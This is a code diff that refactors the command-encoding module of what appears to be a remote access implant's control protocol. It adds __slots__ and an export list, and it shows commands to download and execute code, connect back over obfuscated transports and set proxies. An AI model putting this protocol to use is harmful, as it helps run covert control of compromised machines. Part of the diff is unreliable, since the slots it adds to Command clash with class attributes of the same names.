@@ -1,5 +1,20 @@
 # -*- coding: utf-8 -*-
 
+__all__ = (
+    'Command',
+    'Poll', 'Ack', 'Idle',
+    'SystemStatus',
+    'Sleep', 'CheckConnect',
+    'Reexec', 'Exit', 'Disconnect',
+    'Policy', 'Kex', 'SystemInfo',
+    'SetProxy', 'Connect', 'DownloadExec',
+    'PasteLink', 'OnlineStatus', 'PortQuizPort',
+    'OnlineStatusRequest', 'PupyState',
+    'ConnectablePort', 'Error', 'ParcelInvalidCrc',
+    'ParcelInvalidPayload', 'ParcelInvalidCommand',
+    'Parcel',
+)
+
 import struct
 import netaddr
 import re
@@ -31,6 +46,8 @@ def to_bytes(value, size=0):
     return bytes
 
 class Command(object):
+    __slots__ = ( 'session_required', 'internet_required' )
+
     session_required = False
     internet_required = False
 
@@ -42,6 +59,8 @@ class Command(object):
         return Command(), 0
 
 class Poll(Command):
+    __slots__ = ()
+
     @staticmethod
     def unpack(data):
         return Poll(), 0
@@ -50,6 +69,8 @@ class Poll(Command):
         return '{POLL}'
 
 class SystemStatus(Command):
+    __slots__ = ( 'cpu', 'users', 'mem', 'listen', 'remote', 'idle' )
+
     @staticmethod
     def unpack(data):
         return SystemStatus(*struct.unpack_from('BBBBBB', data)), 6
@@ -147,6 +168,8 @@ class SystemStatus(Command):
 
 
 class Ack(Command):
+    __slots__ = ( 'amount' )
+
     def __init__(self, amount=0):
         self.amount = amount
 
@@ -162,6 +185,8 @@ class Ack(Command):
 
 
 class Idle(Command):
+    __slots__ = ()
+
     @staticmethod
     def unpack(data):
         return Idle(), 0
@@ -170,6 +195,8 @@ class Idle(Command):
         return '{IDLE}'
 
 class Sleep(Command):
+    __slots__ = ( 'timeout' )
+
     @staticmethod
     def unpack(data):
         return Sleep(
@@ -186,6 +213,8 @@ class Sleep(Command):
         return '{{SLEEP: {}}}'.format(self.timeout)
 
 class CheckConnect(Command):
+    __slots__ = ( 'host', 'port_start', 'port_end' )
+
     @staticmethod
     def unpack(data):
         host, port_start, port_end = struct.unpack_from('IHH', data)
@@ -215,6 +244,8 @@ class CheckConnect(Command):
             self.host, self.port_start, self.port_end)
 
 class Reexec(Command):
+    __slots__ = ()
+
     @staticmethod
     def unpack(data):
         return Reexec(), 0
@@ -223,6 +254,8 @@ class Reexec(Command):
         return '{REEXEC}'
 
 class Exit(Command):
+    __slots__ = ()
+
     @staticmethod
     def unpack(data):
         return Exit(), 0
@@ -231,6 +264,8 @@ class Exit(Command):
         return '{EXIT}'
 
 class Disconnect(Command):
+    __slots__ = ()
+
     @staticmethod
     def unpack(data):
         return Disconnect(), 0
@@ -239,6 +274,8 @@ class Disconnect(Command):
         return '{DISCONNECT}'
 
 class Policy(Command):
+    __slots__ = ( 'timestamp', 'poll', 'kex' )
+
     def __init__(self, poll, kex, timestamp=None):
         self.timestamp = timestamp or time.time()
         self.poll = poll
@@ -259,6 +296,8 @@ class Policy(Command):
         return Policy(poll, kex, timestamp), 8
 
 class Kex(Command):
+    __slots__ = ( 'parcel' )
+
     def __init__(self, parcel):
         self.parcel = parcel
 
@@ -278,6 +317,12 @@ class Kex(Command):
         return Kex(data[1:1+length]), 1+length
 
 class SystemInfo(Command):
+
+    __slots__ = (
+        'system', 'arch', 'node', 'boottime',
+        'internal', 'external_ip', 'internet'
+    )
+
     session_required = True
 
     # To do, add more? Who knows how platform.uname looks like on other platforms?
@@ -403,6 +448,8 @@ class SystemInfo(Command):
         ), 1+6+8
 
 class SetProxy(Command):
+    __slots__ = ( 'scheme', 'ip', 'port', 'user', 'password' )
+
     well_known_proxy_schemes_decode = dict(enumerate([
         'none', 'socks4', 'socks5', 'http', 'any'
     ], 1))
@@ -471,6 +518,8 @@ class SetProxy(Command):
         )
 
 class Connect(Command):
+    __slots__ = ( 'ip', 'port', 'transport' )
+
     well_known_transports_decode = dict(enumerate([
         'obfs3','kc4','http','tcp_cleartext','rsa',
         'ssl','udp_cleartext','scramblesuit','ssl_rsa', 'ec4',
@@ -532,6 +581,9 @@ class Connect(Command):
         return Connect(host, port, transport), 1+length
 
 class DownloadExec(Command):
+
+    __slots__ = ( 'proxy', 'url', 'action' )
+
     # 2 bits - 3 max
     well_known_downloadexec_action_decode = dict(enumerate([
         'pyexec', 'exec', 'sh'
@@ -617,6 +669,9 @@ class DownloadExec(Command):
         ), action, proxy), bsize+plen
 
 class PasteLink(Command):
+
+    __slots__ = ( 'url', 'action' )
+
     internet_required = True
 
     # 15 max - 4 bits
@@ -734,6 +789,9 @@ class PasteLink(Command):
             return PasteLink(data[1:length+1], action), 1+length
 
 class OnlineStatus(Command):
+
+    __slots__ = ( 'offset', 'mintime', 'register' )
+
     @staticmethod
     def unpack(data):
         total, offset, mintime, register = struct.unpack_from('>BhHI', data)
@@ -791,6 +849,9 @@ class OnlineStatus(Command):
                     ])) for k,v in self.get_dict().iteritems()))
 
 class PortQuizPort(Command):
+
+    __slots__ = ( 'ports' )
+
     @staticmethod
     def unpack(data):
         ports_count, = struct.unpack_from('B', data)
@@ -810,6 +871,9 @@ class PortQuizPort(Command):
         return '{{PORTQUIZ: {}}}'.format(','.join(str(x) for x in sorted(self.ports)))
 
 class OnlineStatusRequest(Command):
+
+    __slots__ = ()
+
     @staticmethod
     def unpack(data):
         return OnlineStatusRequest(), 0
@@ -818,6 +882,9 @@ class OnlineStatusRequest(Command):
         return '{ONLINE-STATUS-REQUEST}'
 
 class PupyState(Command):
+
+    __slots__ = ( 'connected', 'pstore_dirty' )
+
     @staticmethod
     def unpack(data):
         records_count, = struct.unpack_from('B', data)
@@ -849,6 +916,9 @@ class PupyState(Command):
             self.connected, self.pstore_dirty)
 
 class ConnectablePort(Command):
+
+    __slots__ = ( 'ip', 'ports' )
+
     @staticmethod
     def unpack(data):
         ip, ports_count = struct.unpack_from('>IB', data)
@@ -875,6 +945,9 @@ class ConnectablePort(Command):
 
 
 class Error(Command):
+
+    __slots__ = ( 'error', 'message' )
+
     errors = [
         'NO_ERROR',
         'NO_SESSION',
@@ -909,23 +982,35 @@ class Error(Command):
 
 
 class ParcelInvalidCrc(Exception):
+
+    __slots__ = ()
+
     @property
     def error(self):
         return Error('CRC_FAILED')
 
 class ParcelInvalidPayload(Exception):
+
+    __slots__ = ()
+
     @property
     def error(self):
         return Error('CRC_FAILED')
 
 class ParcelInvalidCommand(Exception):
+
+    __slots__ = ( 'command' )
+
     def __init__(self, command):
         self.command = command
 
     def __repr__(self):
-        return 'Unknown command: {}'.format(command)
+        return 'Unknown command: {}'.format(self.command)
 
 class Parcel(object):
+
+    __slots__ = ( 'commands' )
+
     MAX_PARCEL_SIZE = 35
 
     # Explicitly define commands. In other case make break something
